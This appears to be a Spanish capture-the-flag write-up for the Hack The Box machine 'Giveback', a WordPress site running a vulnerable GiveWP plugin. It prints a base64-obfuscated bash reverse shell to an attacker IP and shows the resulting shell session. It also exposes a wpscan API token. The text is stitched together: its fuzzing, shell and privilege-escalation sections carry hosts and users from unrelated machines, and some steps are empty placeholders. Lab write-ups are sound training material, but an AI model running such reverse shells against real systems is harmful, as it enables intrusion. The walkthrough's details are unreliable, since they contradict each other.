
# Giveback

<figure><img src="/files/wSsQXIIElhaOnI1hP1ue" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Giveback`
* **IP:** `10.10.11.94`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟡 Media`
* **Fecha:** `DD-MM-AAAA`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -v -sCV -T5 10.10.11.94
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)
|_  256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)
80/tcp open  http    nginx 1.28.0
|_http-server-header: nginx/1.28.0
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
|_http-generator: WordPress 6.8.1
|_http-favicon: Unknown favicon MD5: 000BF649CC8F6BF27CFB04D1BCDCD3C7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.11.94 giveback.htb" | sudo tee -a /etc/hosts
```

### Acceso Web

Accedemos a `http://giveback.htb` y observamos que parece ser una plataforma de donaciones montada en Wordpress:

<figure><img src="/files/hkH833gegNWLc5yXeU3D" alt=""><figcaption></figcaption></figure>

### Enumeración de Wordpress

#### **Búsqueda de temas instalados**

Parece que tiene activo el tema Bizberg 6.8.1

```bash
afsh4ck@kali$ curl -s http://giveback.htb/ | grep themes

<link rel='stylesheet' id='bootstrap-css' href='http://giveback.htb/wp-content/themes/bizberg/assets/bootstrap/css/bootstrap.min.css?ver=0.3' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-5-css' href='http://giveback.htb/wp-content/themes/bizberg/assets/icons/font-awesome-5/css/all.css?ver=0.3' type='text/css' media='all' />
<link rel='stylesheet' id='bizberg-main-css' href='http://giveback.htb/wp-content/themes/bizberg/assets/css/main.css?ver=0.3' type='text/css' media='all' />
<link rel='stylesheet' id='bizberg-component-css' href='http://giveback.htb/wp-content/themes/bizberg/assets/css/component.css?ver=0.3' type='text/css' media='all' />
<link rel='stylesheet' id='bizberg-style2-css' href='http://giveback.htb/wp-content/themes/bizberg/assets/css/style.css?ver=0.3' type='text/css' media='all' />
<link rel='stylesheet' id='bizberg-responsive-css' href='http://giveback.htb/wp-content/themes/bizberg/assets/css/responsive.css?ver=0.3' type='text/css' media='all' />
<link rel='stylesheet' id='green_wealth_chld_css-css' href='http://giveback.htb/wp-content/themes/bizberg/style.css?ver=6.8.1' type='text/css' media='all' />
<link rel='stylesheet' id='bizberg-style-css' href='http://giveback.htb/wp-content/themes/green-wealth/style.css?ver=6.8.1' type='text/css' media='all' />
<script type="text/javascript" src="http://giveback.htb/wp-content/themes/green-wealth/script.js?ver=6.8.1" id="green_wealth_scripts-js"></script>
<script type="text/javascript" src="http://giveback.htb/wp-content/themes/bizberg/assets/bootstrap/js/bootstrap.min.js?ver=0.3" id="bootstrap-js"></script>
```

#### **Búsqueda de plugins instalados**

```bash
afsh4ck@kali$ curl -s http://giveback.htb/ | grep plugins

<link rel='stylesheet' id='give-styles-css' href='http://giveback.htb/wp-content/plugins/give/assets/dist/css/give.css?ver=3.14.0' type='text/css' media='all' />
<link rel='stylesheet' id='give-donation-summary-style-frontend-css' href='http://giveback.htb/wp-content/plugins/give/assets/dist/css/give-donation-summary.css?ver=3.14.0' type='text/css' media='all' />
<script type="text/javascript" src="http://giveback.htb/wp-content/plugins/give/assets/dist/js/give.js?ver=fd6dd27625eb0240" id="give-js"></script>
{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/*"},{"not":{"href_matches":["\/wp-*.php","\/wp-admin\/*","\/wp-content\/uploads\/*","\/wp-content\/*","\/wp-content\/plugins\/*","\/wp-content\/themes\/green-wealth\/*","\/wp-content\/themes\/bizberg\/*","\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
<script type="text/javascript" src="http://giveback.htb/wp-content/plugins/give/assets/dist/js/give-donation-summary.js?ver=3.14.0" id="give-donation-summary-script-frontend-js"></script>
```

#### WP Scan - Enumeración

```bash
 sudo wpscan --url http://giveback.htb --enumerate --api-token sa9wEcMOko6mOYZwVeOpcbVJWTqa0QUl80NIe1NGONg
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 
[+] URL: http://giveback.htb/ [10.10.11.94]
[+] Started: Tue Dec 30 03:26:25 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.28.0
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://giveback.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://giveback.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 6.8.1 identified (Insecure, released on 2025-04-30).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://giveback.htb/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://giveback.htb/, Match: 'WordPress 6.8.1'
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 6.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 6.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/

[+] WordPress theme in use: bizberg
 | Location: http://giveback.htb/wp-content/themes/bizberg/
 | Latest Version: 4.2.9.79 (up to date)
 | Last Updated: 2024-06-09T00:00:00.000Z
 | Readme: http://giveback.htb/wp-content/themes/bizberg/readme.txt
 | Style URL: http://giveback.htb/wp-content/themes/bizberg/style.css?ver=6.8.1
 | Style Name: Bizberg
 | Style URI: https://bizbergthemes.com/downloads/bizberg-lite/
 | Description: Bizberg is a perfect theme for your business, corporate, restaurant, ingo, ngo, environment, nature,...
 | Author: Bizberg Themes
 | Author URI: https://bizbergthemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 4.2.9.79 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://giveback.htb/wp-content/themes/bizberg/style.css?ver=6.8.1, Match: 'Version: 4.2.9.79'

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] give
 | Location: http://giveback.htb/wp-content/plugins/give/
 | Last Updated: 2025-12-08T20:09:00.000Z
 | [!] The version is out of date, the latest version is 4.13.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Meta Tag (Passive Detection)
 |  Javascript Var (Passive Detection)
 |
 | [!] 20 vulnerabilities identified:
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.14.2 - Missing Authorization to Authenticated (Subscriber+) Limited File Deletion
 |     Fixed in: 3.14.2
 |     References:
 |      - https://wpscan.com/vulnerability/528b861e-64bf-4c59-ac58-9240db99ef96
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5941
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/824ec2ba-b701-46e9-b237-53cd7d0e46da
 |
 | [!] Title: GiveWP < 3.14.2 - Unauthenticated PHP Object Injection to RCE
 |     Fixed in: 3.14.2
 |     References:
 |      - https://wpscan.com/vulnerability/fdf7a98b-8205-4a29-b830-c36e1e46d990
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5932
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/93e2d007-8157-42c5-92ad-704dc80749a3
 |
 | [!] Title: GiveWP < 3.16.0 - Unauthenticated Full Path Disclosure
 |     Fixed in: 3.16.0
 |     References:
 |      - https://wpscan.com/vulnerability/6ff11e50-188e-4191-be12-ab4bde9b6d27
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6551
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/2a13ce09-b312-4186-b0e2-63065c47f15d
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.16.2 - Authenticated (GiveWP Manager+) SQL Injection via order Parameter
 |     Fixed in: 3.16.2
 |     References:
 |      - https://wpscan.com/vulnerability/aed98bed-b6ed-4282-a20e-995515fd43a1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9130
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/4a3cae01-620d-405e-baf6-2d66a5b429b3
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.16.2 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.16.2
 |     References:
 |      - https://wpscan.com/vulnerability/c1807282-5f15-4b21-81b6-dcb8b03618bd
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8353
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/c4c530fa-eaf4-4721-bfb6-9fc06d7f343c
 |
 | [!] Title: GiveWP < 3.16.0 - Cross-Site Request Forgery
 |     Fixed in: 3.16.0
 |     References:
 |      - https://wpscan.com/vulnerability/582c6a46-486e-41ca-9c45-96dfe8b8ddbb
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-47315
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7ce9bac7-60bb-4880-9e37-4d71f02ee941
 |
 | [!] Title: GiveWP < 3.16.4 - Unauthenticated PHP Object Injection to Remote Code Execution
 |     Fixed in: 3.16.4
 |     References:
 |      - https://wpscan.com/vulnerability/793bdc97-69eb-43c3-aab0-c86a76285f36
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9634
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b8eb3aa9-fe60-48b6-aa24-7873dd68b47e
 |
 | [!] Title: Give < 3.19.0 - Reflected XSS
 |     Fixed in: 3.19.0
 |     References:
 |      - https://wpscan.com/vulnerability/5f196294-5ba9-45b6-a27c-ab1702cc001f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-11921
 |
 | [!] Title: GiveWP < 3.19.3 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.19.3
 |     References:
 |      - https://wpscan.com/vulnerability/571542c5-9f62-4e38-baee-6bbe02eec4af
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12877
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b2143edf-5423-4e79-8638-a5b98490d292
 |
 | [!] Title: GiveWP < 3.19.4 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.19.4
 |     References:
 |      - https://wpscan.com/vulnerability/82afc2f7-948b-495e-8ec2-4cd7bbfe1c61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-22777
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/06a7ff0b-ec6b-490c-9bb0-fbb5c1c337c4
 |
 | [!] Title: GiveWP < 3.20.0 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.20.0
 |     References:
 |      - https://wpscan.com/vulnerability/e27044bd-daab-47e6-b399-de94c45885c5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0912
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8a8ae1b0-e9a0-4179-970b-dbcb0642547c
 |
 | [!] Title: Give < 3.22.1 - Missing Authorization to Unauthenticated Arbitrary Earning Reports Disclosure via give_reports_earnings Function
 |     Fixed in: 3.22.1
 |     References:
 |      - https://wpscan.com/vulnerability/ebe88626-2127-4021-aa8e-f2f47e12ad4f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-2025
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/40595943-121d-4492-a0ed-f2de1bd99fda
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.22.2 - Authenticated (Subscriber+) Sensitive Information Exposure
 |     Fixed in: 3.22.2
 |     References:
 |      - https://wpscan.com/vulnerability/b331a81b-b7cc-4e0a-a088-26468a835cc5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-2331
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b4d9acfb-bb9d-4b00-b439-c7ccea751f8d
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.3.1 - Missing Authorization To Authenticated (Contributor+) Campaign Data View And Modification
 |     Fixed in: 4.3.1
 |     References:
 |      - https://wpscan.com/vulnerability/f819ea85-bf28-4e8c-b72b-59741e7e9cee
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-4571
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8f03b4ef-e877-430e-a440-3af0feca818c
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.6.0 - Authenticated (GiveWP worker+) Stored Cross-Site Scripting
 |     Fixed in: 4.6.0
 |     References:
 |      - https://wpscan.com/vulnerability/fda8eaea-ca20-417a-896b-49c1fa0a1c07
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-7205
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/39e501d8-88a0-4625-aeb0-aa33fc89a8d4
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.6.1 - Unauthenticated Donor Data Exposure
 |     Fixed in: 4.6.1
 |     References:
 |      - https://wpscan.com/vulnerability/4739fdb8-9444-44b9-8e98-7a299e6fe186
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-8620
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/6dc7c5a6-513e-4aa8-9538-0ac6fb37c867
 |
 | [!] Title: GiveWP < 4.6.1 - Missing Authorization to Donation Update
 |     Fixed in: 4.6.1
 |     References:
 |      - https://wpscan.com/vulnerability/bdfb968d-df2b-43ed-9a9c-f9b15d8457f3
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-7221
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8766608e-df72-4b9d-a301-a50c64fadc9a
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.10.1 - Missing Authorization to Unauthenticated Forms-Campaign Association
 |     Fixed in: 4.10.1
 |     References:
 |      - https://wpscan.com/vulnerability/5dccab73-e06f-4c01-837b-eddf42ea789d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-11228
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ddf9a043-5eb6-46fd-88c2-0f5a04f73fc9
 |
 | [!] Title: GiveWP < 4.10.1 - Unauthenticated Forms and Campaigns Disclosure
 |     Fixed in: 4.10.1
 |     References:
 |      - https://wpscan.com/vulnerability/e7a291a5-3846-42e7-b4f2-7b2383326d4c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-11227
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/54db1807-69ff-445c-9e02-9abce9fd3940
 |
 | [!] Title: GiveWP < 4.13.1 - Unauthenticated Stored XSS via 'name'
 |     Fixed in: 4.13.1
 |     References:
 |      - https://wpscan.com/vulnerability/c03133b5-80f0-4d70-ad22-5dbd7e290031
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13206
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/95823720-e1dc-46c1-887b-ffd877b2fbe5
 |
 | Version: 3.14.0 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://giveback.htb/wp-content/plugins/give/assets/dist/css/give.css?ver=3.14.0
 | Confirmed By:
 |  Meta Tag (Passive Detection)
 |   - http://giveback.htb/, Match: 'Give v3.14.0'
 |  Javascript Var (Passive Detection)
 |   - http://giveback.htb/, Match: '"1","give_version":"3.14.0","magnific_options"'

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:02:12 <=======================================================================================> (652 / 652) 100.00% Time: 00:02:12
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:08:37 <=====================================================================================> (2575 / 2575) 100.00% Time: 00:08:37

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:26 <========================================================================================> (137 / 137) 100.00% Time: 00:00:26

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:15 <==============================================================================================> (75 / 75) 100.00% Time: 00:00:15

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:20 <===================================================================================> (100 / 100) 100.00% Time: 00:00:20

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <=========================================================================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] user
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://giveback.htb/wp-json/wp/v2/users/?per_page=100&page=1
 |  Oembed API - Author URL (Aggressive Detection)
 |   - http://giveback.htb/wp-json/oembed/1.0/embed?url=http://giveback.htb/&format=json
 |  Author Sitemap (Aggressive Detection)
 |   - http://giveback.htb/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 5
 | Requests Remaining: 20

[+] Finished: Tue Dec 30 03:38:33 2025
[+] Requests Done: 3608
[+] Cached Requests: 12
[+] Data Sent: 994.005 KB
[+] Data Received: 1.635 MB
[+] Memory used: 276.688 MB
[+] Elapsed time: 00:12:08
```

Observamos que la máquina tiene una versión vulnerable del plugin **GiveWP (v3.14.0)**. Hay múltiples vulnerabilidades reportadas, pero una de las más críticas es **CVE-2024-5932** - **Unauthenticated PHP Object Injection to RCE** que intentaremos explotar.

***

## <mark style="color:purple;">Enumeración Web</mark>

### Fuzzing de Directorios

```bash
dirsearch -u http://giveback.htb -x 404
```

```bash
gobuster dir -u http://planning.htb -w /usr/share/wordlists/dirb/common.txt
```

```bash
ffuf -u http://planning.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Directorios encontrados:**

* `/about.php`
* `/contact.php`
* `/js/` (403)
* `/lib/` (403)

No se encuentran datos sensibles directamente accesibles.

### Análisis de vulnerabilidades

```bash
nuclei -u planning.htb
```

***

## <mark style="color:purple;">Enumeración de Subdominios (VHosts)</mark>

#### Comprobación de Content-Length

```bash
curl -s -I http://10.10.11.68 -H "Host: defnotvalid.planning.htb" | grep "Content-Length:"

Content-Length: 178
```

#### Fuzzing con FFUF

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://10.10.11.68/ -H 'Host: FUZZ.planning.htb' -fs 178
```

**Encontramos el subdominio:** `grafana.planning.htb`

Lo añadimos a `/etc/hosts` y accedemos a un panel de Grafana v11.0.0.

***

## <mark style="color:purple;">Explotación</mark>

### Investigación de CVEs / Exploits

Exploramos CVEs relacionados con GiveWP en fuentes como:

* <https://sploitus.com>
* <https://exploit-db.com>
* <https://github.com>

**Exploit seleccionado:**

{% embed url="<https://github.com/EQSTLab/CVE-2024-5932>" %}

### Ejecución del Exploit

Describir paso a paso cómo se logró la ejecución remota o el primer acceso.

### Estabilizar sesión

Usaremos Penelope para estabilizar nuestra sesión y tener persistencia:

{% embed url="<https://github.com/brightio/penelope>" %}

```bash
pipx install git+https://github.com/brightio/penelope

penelope
```

<figure><img src="/files/QFe2CD0y7qzQGRsfXtv4" alt=""><figcaption></figcaption></figure>

Usaremos el payload en bash de la sección `tun0`, ya que estamos conectados por VPN:

```bash
➤  tun0 → 10.10.15.3:4444

Bash TCP
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMy80NDQ0IDA+JjEpICY=|base64 -d|bash
```

Lo ejecutamos en la máquina objetivo:

```shell-session
nc -nlvp 4444  
listening on [any] 4444 ...
connect to [10.10.15.3] from (UNKNOWN) [10.10.11.92] 50602
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls
conversor.htb
$ printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMy80NDQ0IDA+JjEpICY=|base64 -d|bash
$ 
```

Y automáticamente recibimos la shell PTY con persistencia:

{% hint style="warning" %}
Con F12 podemos cerrar la sesión para interactuar con ella más tarde
{% endhint %}

<figure><img src="/files/oUGF21qJR5YQYE3Xk3kI" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Acceso Inicial</mark>

Una vez obtenido acceso:

* Verificar usuario actual (`whoami`)
* Verificar entorno (`uname -a`, `id`, `sudo -l`)

***

## <mark style="color:purple;">User Flag</mark>

Ubicación y obtención de la flag del usuario:

```bash
cat /home/<usuario>/user.txt
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

No tenemos sudo como el usuario Oliver:

```shell-session
oliver@editor:/tmp$ sudo -l                                                        
[sudo] password for oliver: 
Sorry, user oliver may not run sudo on editor.
```

### Versión de SUDO

```shell-session
ike@expressway:~$ sudo -V
Sudo version 1.9.17
```

Esta versión de sudo es vulnerable al CVE-2025-32463, y encontramos varios PoC para explotarlo.

### Enumeración de archivos con permisos especiales

Buscando archivos con permisos especiales, encontré un archivo `ndsudo` sospechoso:

```shell-session
oliver@editor:/tmp$ find / -user root -perm -4000 -print 2>/dev/null

/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
```

### Ver servicios internos corriendo

```shell-session
oliver@editor:/tmp$ ss -tuln

Netid State   Recv-Q  Send-Q        Local Address:Port    Peer Address:Port Process 
udp   UNCONN  0       0                 127.0.0.1:8125         0.0.0.0:*            
udp   UNCONN  0       0             127.0.0.53%lo:53           0.0.0.0:*            
tcp   LISTEN  0       128                 0.0.0.0:22           0.0.0.0:*            
tcp   LISTEN  0       4096          127.0.0.53%lo:53           0.0.0.0:*            
tcp   LISTEN  0       511                 0.0.0.0:80           0.0.0.0:*            
tcp   LISTEN  0       151               127.0.0.1:3306         0.0.0.0:*            
tcp   LISTEN  0       4096              127.0.0.1:19999        0.0.0.0:*            
tcp   LISTEN  0       4096              127.0.0.1:8125         0.0.0.0:*            
tcp   LISTEN  0       4096              127.0.0.1:45249        0.0.0.0:*            
tcp   LISTEN  0       70                127.0.0.1:33060        0.0.0.0:*            
tcp   LISTEN  0       5                   0.0.0.0:8000         0.0.0.0:*            
tcp   LISTEN  0       128                    [::]:22              [::]:*            
tcp   LISTEN  0       511                    [::]:80              [::]:*            
tcp   LISTEN  0       50       [::ffff:127.0.0.1]:8079               *:*            
tcp   LISTEN  0       50                        *:8080               *:*   
```

Herramientas usadas:

* `sudo -l`
* `find / -perm -4000 2>/dev/null`
* `linpeas.sh`
* `pspy`

#### Técnica aplicada

Describir la técnica usada: binario con SUID, cronjob mal configurado, credenciales duras, etc.

***

## 👑 <mark style="color:purple;">Root Flag</mark>

```bash
cat /root/root.txt
```
